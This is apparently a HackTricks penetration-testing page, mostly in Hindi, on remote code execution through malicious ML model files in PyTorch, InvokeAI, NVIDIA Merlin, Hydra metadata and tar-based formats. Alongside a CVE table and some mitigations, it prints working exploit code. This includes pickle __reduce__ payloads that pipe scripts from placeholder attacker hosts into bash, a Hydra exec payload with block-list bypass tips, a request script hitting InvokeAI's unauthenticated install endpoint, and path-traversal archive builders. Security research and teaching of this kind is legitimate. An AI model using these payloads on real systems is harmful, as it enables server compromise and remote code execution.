# Models RCE

{{#include ../banners/hacktricks-training.md}}

## RCE के लिए मॉडल लोड करना

Machine Learning मॉडल आम तौर पर अलग‑अलग फॉर्मैट्स में साझा होते हैं, जैसे ONNX, TensorFlow, PyTorch, आदि। इन मॉडलों को उपयोग के लिए developers machines या production systems में लोड किया जा सकता है। सामान्यतः मॉडल में malicious code नहीं होना चाहिए, लेकिन कुछ मामलों में मॉडल को सिस्टम पर arbitrary code execute करने के लिए उपयोग किया जा सकता है — या तो किसी intended feature के कारण या model loading library में vulnerability के कारण।

लेखन के समय इस प्रकार की कुछ vulneravilities के उदाहरण ये हैं:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | मॉडल checkpoint में malicious pickle कोड निष्पादन की ओर ले जाता है (बायपास करता है `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download कोड निष्पादन का कारण बनता है; management API में Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint `load_model_trainer_states_from_checkpoint` के दौरान pickle reducer ट्रिगर करता है → ML worker में code execution            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML से मॉडल लोड करने पर `yaml.unsafe_load` का उपयोग होता है (कोड निष्पादन) <br> **Lambda** layer के साथ मॉडल लोड करने पर arbitrary Python code चलता है          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | crafted `.tflite` मॉडल integer overflow ट्रिगर करता है → heap corruption (संभावित RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` के माध्यम से मॉडल लोड करने से pickle attacker के `__reduce__` payload के साथ execute हो जाता है                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` डिफ़ॉल्ट रूप से pickled object arrays की अनुमति देता है – malicious `.npy/.npz` code exec ट्रिगर करते हैं                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model के external-weights path directory से बाहर जा सकता है (arbitrary files पढ़ना) <br> Malicious ONNX model tar arbitrary files overwrite कर सकता है (जिससे RCE हो सकता है) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operator वाले मॉडल को attacker के native code लोड करने की आवश्यकता हो सकती है; जटिल मॉडल ग्राफ़्स लॉजिक का दुरुपयोग करके अनचाही computations चला सकते हैं   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` सक्षम करके model-load API का उपयोग relative path traversal की अनुमति देता है ताकि फ़ाइलें लिखी जा सकें (उदा., `.bashrc` को overwrite कर RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | खराब GGUF model फ़ाइल parser में heap buffer overflows का कारण बनती है, जिससे victim सिस्टम पर arbitrary code execution संभव होता है                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layer वाला malicious HDF5 (`.h5`) मॉडल लोड पर कोड चलाता है (Keras safe_mode पुराने फ़ॉर्मेट को कवर नहीं करता – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | कई ML टूल (उदा., pickle-based model formats, Python `pickle.load`) मॉडल फ़ाइलों में embedded arbitrary code को execute करेंगे जब तक mitigated ना किया जाए | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | attacker-controlled model metadata/config `_target_` को arbitrary callable (उदा., `builtins.exec`) पर सेट कर देता है → load के दौरान executed होता है, यहां तक कि “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) में भी | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

इसके अलावा, कुछ python pickle‑based मॉडल हैं जैसे कि PyTorch द्वारा उपयोग किए जाने वाले, जिन्हें `weights_only=True` के साथ लोड न करने पर सिस्टम पर arbitrary code execute करने के लिए उपयोग किया जा सकता है। इसलिए, कोई भी pickle‑based मॉडल इस प्रकार के हमलों के लिए विशेष रूप से संवेदनशील हो सकता है, भले ही वे ऊपर तालिका में सूचीबद्ध न हों।

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` किसी भी dotted `_target_` को configuration/metadata object में import करके call करता है। जब लाइब्रेरीज़ **untrusted model metadata** को `instantiate()` में फीड करती हैं, तो attacker एक callable और arguments प्रदान कर सकता है जो मॉडल लोड के दौरान तुरंत चल जाते हैं (किसी pickle की आवश्यकता नहीं)।

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- NeMo के `restore_from/from_pretrained`, uni2TS HuggingFace coders, और FlexTok loaders में मॉडल इनिशियलाइज़ेशन से पहले ट्रिगर होता है।
- Hydra की string block-list को वैकल्पिक import paths (उदा., `enum.bltns.eval`) या application-resolved नामों (उदा., `nemo.core.classes.common.os.system` → `posix`) के माध्यम से बायपास किया जा सकता है।
- FlexTok stringified metadata को `ast.literal_eval` से पार्स भी करता है, जिससे Hydra कॉल से पहले DoS (CPU/memory blowup) सक्षम हो जाता है।

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` Stable-Diffusion के लिए एक लोकप्रिय open-source वेब इंटरफ़ेस है। संस्करणें **5.3.1 – 5.4.2** `/api/v2/models/install` REST endpoint एक्सपोज़ करती हैं जो उपयोगकर्ताओं को arbitrary URLs से मॉडल डाउनलोड और load करने की अनुमति देती हैं।

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
जब दिया गया फ़ाइल **PyTorch checkpoint (`*.ckpt`)** होता है, `torch.load` **pickle deserialization** करता है। क्योंकि सामग्री सीधे user-controlled URL से आती है, an attacker checkpoint के अंदर एक malicious object जिसमें custom `__reduce__` method होता है, embed कर सकता है; यह method **during deserialization** निष्पादित होता है, जिससे InvokeAI server पर **remote code execution (RCE)** हो जाता है।

This vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. अपने नियंत्रण वाले HTTP server पर `payload.ckpt` होस्ट करें (उदा. `http://ATTACKER/payload.ckpt`).
3. कमजोर endpoint को ट्रिगर करें (कोई authentication आवश्यक नहीं):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. जब InvokeAI फ़ाइल डाउनलोड करता है तो यह `torch.load()` को कॉल करता है → `os.system` gadget चल जाता है और हमलावर InvokeAI प्रक्रिया के context में code execution प्राप्त कर लेता है।

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरा flow स्वचालित कर देता है।

#### शर्तें

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` हमलावर द्वारा पहुंच योग्य होना चाहिए  
•  Process के पास shell commands execute करने की permissions हो

#### निवारक उपाय

* Upgrade करें to **InvokeAI ≥ 5.4.3** – patch डिफ़ॉल्ट रूप से `scan=True` सेट करता है और deserialization से पहले malware scanning करता है।  
* जब checkpoints प्रोग्रामेटिक रूप से लोड किए जाएं तो `torch.load(file, weights_only=True)` का उपयोग करें या नया [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper प्रयोग करें।  
* model sources के लिए allow-lists / signatures लागू करें और सेवा को least-privilege पर चलाएं।

> ⚠️ याद रखें कि **कोई भी** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) स्वाभाविक रूप से असुरक्षित है untrusted sources से deserialize करने के लिए।

---

यदि आपको पुराने InvokeAI वर्ज़न reverse proxy के पीछे चलाए रखना अनिवार्य है तो एक अस्थायी (ad-hoc) निवारक उपाय का उदाहरण:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE असुरक्षित `torch.load` के माध्यम से (CVE-2025-23298)

NVIDIA की Transformers4Rec (Merlin का हिस्सा) ने एक असुरक्षित checkpoint loader एक्सपोज़ किया जो user-provided paths पर सीधे `torch.load()` को कॉल करता था। चूँकि `torch.load` Python के `pickle` पर निर्भर करता है, एक attacker-controlled checkpoint deserialization के दौरान reducer के जरिए arbitrary code चला सकता है।

कमज़ोर पथ (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

क्यों यह RCE पैदा करता है: Python के `pickle` में, एक object एक reducer (`__reduce__`/`__setstate__`) परिभाषित कर सकता है जो एक callable और उसके arguments लौटाता है। वह callable unpickling के दौरान execute होता है। यदि ऐसा object किसी checkpoint में मौजूद होता है, तो यह किसी भी weights के उपयोग से पहले चल जाता है।

न्यूनतम malicious checkpoint उदाहरण:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
डिलीवरी वेक्टर और ब्लास्ट रेडियस:
- Trojanized checkpoints/models जो repos, buckets, या artifact registries के माध्यम से साझा किए जाते हैं
- Automated resume/deploy pipelines जो checkpoints को auto-load करती हैं
- Execution training/inference workers के अंदर होता है, अक्सर elevated privileges के साथ (उदा., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने सीधे `torch.load()` को बदलकर एक restricted, allow-listed deserializer लागू किया जो `transformers4rec/utils/serialization.py` में है। नया loader types/fields को validate करता है और load के दौरान arbitrary callables के invoke होने को रोकता है।

PyTorch checkpoints के लिए रक्षात्मक निर्देश:
- Untrusted data को unpickle न करें। जहां संभव हो non-executable formats जैसे [Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX को प्राथमिकता दें।
- यदि आपको PyTorch serialization का उपयोग करना ही है, तो सुनिश्चित करें `weights_only=True` (नए PyTorch में समर्थित) या Transformers4Rec patch जैसा एक custom allow-listed unpickler इस्तेमाल करें।
- मॉडल provenance/signatures को लागू करें और sandbox deserialization का उपयोग करें (seccomp/AppArmor; non-root user; restricted FS और no network egress)।
- checkpoint load समय ML services से unexpected child processes के लिए मॉनिटर करें; `torch.load()`/`pickle` उपयोग का trace करें।

POC और vulnerable/patch संदर्भ:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – एक दुर्भावनापूर्ण PyTorch मॉडल तैयार करना

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- मॉडल लोड करें:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD एक `resnet` endpoint प्रकट करता है जो उपयोगकर्ता-नियंत्रित डेटा को deserializes करता है। ZDI ने पुष्टि की है कि एक remote attacker एक पीड़ित को मजबूर कर सकता है कि वह एक malicious page/file लोड करे, उस पेज/फ़ाइल के माध्यम से crafted serialized blob को उस endpoint पर push किया जाए, और `root` के रूप में deserialization ट्रिगर हो जाए, जिससे पूरा सिस्टम compromise हो जाता है।

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.


## Models से Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), अधिकांश मॉडल फ़ॉर्मैट जो विभिन्न AI frameworks द्वारा उपयोग किए जाते हैं, archives पर आधारित होते हैं, आमतौर पर `.zip`. इसलिए, इन फ़ॉर्मैट्स का दुरुपयोग करके path traversal attacks किए जा सकते हैं, जिससे उस सिस्टम से arbitrary files पढ़ने की अनुमति मिल सकती है जहाँ model load किया जाता है।

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
या, निम्नलिखित कोड के साथ आप एक ऐसा मॉडल बना सकते हैं जो लोड होने पर `/tmp` निर्देशिका के लिए एक symlink बना देगा:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### विस्तृत अध्ययन: Keras .keras deserialization and gadget hunting

.kera s internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import issue, और allowlist के भीतर post-fix gadget discovery पर एक केंद्रित गाइड के लिए देखें:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## संदर्भ

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
